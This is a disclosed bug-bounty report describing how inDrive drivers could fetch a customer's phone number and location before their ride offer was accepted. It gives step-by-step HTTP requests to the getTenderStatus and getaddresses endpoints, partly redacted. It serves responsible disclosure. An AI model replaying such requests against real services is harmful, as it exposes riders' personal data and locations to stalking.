# # Drivers can access the customers phone number, current location without getting their offer accepted!

## Report Details
- **Report ID**: 1785079
- **URL**: https://hackerone.com/reports/1785079
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2022-11-27T13:19:52.577Z
- **Disclosed**: 2024-02-19T09:03:59.704Z

## Reporter
- **Username**: bugsv2
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: indrive

## Vulnerability Information
## Summary:
Hi Kirill, I wish you are fine today <3
I have a new bug today, leading to leak the phone number and the location of the customer
how? When the **driver** submit an offer/price to the customer, something is getting created called ```“tender”``` ```“id”```

██████████
Then alittle bit later, another requset is getting sent called ```"/api/getTenderStatus?"```

This request of ```getTender``` is asking for ```order_id=``` & ```tender_id=``` , Which got generated on the ```/api/driverrequest``` request (( as the screen shot ))

## Steps to reproduce:

1. Open the driver’s account, and wait till you get a ride from anyone!
    
    ███████
    
2. submit any price for the ride you selected
    
    ███
    
3. Now we can see the request of ```/api/driverrequest```
    
    ```
    POST /api/driverrequest?cid=9415&locale=en_US&job_id=███████ HTTP/1.1
    Host: terra-6.indriverapp.com
    X-App: android 5.8.1
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 293
    Accept-Encoding: gzip, deflate
    User-Agent: okhttp/4.10.0
    Connection: close
    
    phone=█████&token=████&v=7&stream_id=1669551146811201&order_id=█████████&client_id=█████████&████████&type=indriver&price=33&period=2&geo_arrival_time=105&distance=305&███&sn=1
    ```
    
    ```
    HTTP/1.1 200 OK
    Server: QRATOR
    Date: Sun, 27 Nov 2022 12:12:40 GMT
    Content-Type: application/json;charset=utf-8
    Content-Length: 1042
    Connection: close
    Access-Control-Allow-Origin: *
    X-XSS-Protection: 1; mode=block
    
    {"response":{"tender":{"id":█████,"driver_id":████,"client_id":███████,"order_id":███,"status":"wait","created":"Sun, 27 Nov 2022 21:12:40 +0900","modified":"Sun, 27 Nov 2022 21:12:40 +0900","price":33,"timeout":15,"expire_time":"Sun, 27 Nov 2022 21:12:55 +0900","type":"bid","period":2,"currency_code":"","distance":305,"counter_bid_price":0,"counter_bid_timeout":0,"driver":{"id":"████","username":"███████","avatarbig":"██████:██████:███:"",█████████,"carname":"Peugeot","carmodel":"508","carcolor":"black","rating":"5.000000","performed":1,"bid_label":null}}}}
    ```
    
4. Now we see the request and the response, and the customer didn’t accept our offer! But we still have the ```"tender":{"id":█████``` and ```"order_id":█████```
5. Now we gonna send the request of ```/api/getTenderStatus```
    
    ```
    POST /api/getTenderStatus?cid=9415&locale=en_US&job_id=6d4ddf82-40de-4b42-80cc-08c8be40a77e HTTP/1.1
    Host: terra-6.indriverapp.com
    X-App: android 5.8.1
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 129
    Accept-Encoding: gzip, deflate
    User-Agent: okhttp/4.10.0
    Connection: close
    
    order_id=<ORDER-ID>&tender_id=<TENDER-ID>&phone=<PHONE>&token=<TOKEN>&v=7&stream_id=1669550370135120
    ```
    
    Now we can see! 
    
    ███
    
6. Now we have the phone number and the lat,long of the customer. How can we get the location from the lat,long? By the following requset:
    
    ```
    POST /api/getaddresses?cid=9415&locale=en_US HTTP/1.1
    Host: terra-6.indriverapp.com
    X-App: android 5.8.1
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 177
    Accept-Encoding: gzip, deflate
    User-Agent: okhttp/4.10.0
    Connection: close
    
    phone=<NUMBER>&token=<TOKEN>&v=2&stream_id=1669551175078856&██████████&show_plus_code=false&type=start&source=order_form
    ```
    
    ██████

## Impact

* Drivers can leak the customers data, name, phone number, location.
* Drivers can access the customer data and do rides out of the application knowledge.
* Drivers cannot access the customers sensitive data like this. only when their offers get accepted.

## Attachments
No attachments
